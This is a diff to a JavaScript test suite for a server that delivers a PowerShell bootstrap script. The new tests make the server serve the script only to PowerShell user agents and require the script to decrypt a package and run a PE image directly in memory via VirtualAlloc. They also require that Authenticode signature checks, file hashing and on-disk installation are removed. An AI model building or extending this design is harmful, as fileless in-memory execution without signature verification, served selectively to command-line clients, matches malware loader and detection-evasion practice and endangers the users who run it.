@@ -179,6 +179,9 @@ test('bootstrap script routes prefer opaque or root negotiation and keep legacy 
     assert.equal(cfg.legacy_route_enabled, false);
     assert.equal(bootstrap.acceptsBootstrapScript({ headers: { accept: 'application/vnd.aida.bootstrap' } }), true);
     assert.equal(bootstrap.acceptsBootstrapScript({ headers: { accept: 'text/html' } }), false);
+    assert.equal(bootstrap.acceptsBootstrapScript({ headers: { 'user-agent': 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1', accept: '*/*' } }), true);
+    assert.equal(bootstrap.acceptsBootstrapScript({ headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.19041; en-US) PowerShell/7.4.1', accept: '*/*' } }), true);
+    assert.equal(bootstrap.acceptsBootstrapScript({ headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', accept: 'text/html' } }), false);
 });
 
 test('authorize issues a short-lived token and stores only a token HMAC', async () => {
@@ -299,7 +302,15 @@ test('bootstrap script contains encrypted package verification and parses as Pow
     assert.match(script, /manifest signature verification failed/);
     assert.match(script, /Downloading and verifying encrypted package/);
     assert.match(script, /HMACSHA256/);
-    assert.match(script, /Assert-AidaAuthenticode/);
+    assert.match(script, /Decrypt-AidaPackageBytesToMemory/);
+    assert.match(script, /Invoke-AidaPEInMemory/);
+    assert.match(script, /VirtualAlloc/);
+    assert.match(script, /WaitForSingleObject/);
+    assert.doesNotMatch(script, /Assert-AidaAuthenticode/);
+    assert.doesNotMatch(script, /AidaInstallRoot/);
+    assert.doesNotMatch(script, /Move-Item/);
+    assert.doesNotMatch(script, /Start-Process/);
+    assert.doesNotMatch(script, /Get-FileHash/);
     assert.doesNotMatch(script, /\.download/);
     assert.doesNotMatch(script, /tmpDownload/);
     assert.doesNotMatch(script, /Save-AidaFileWithProgress/);
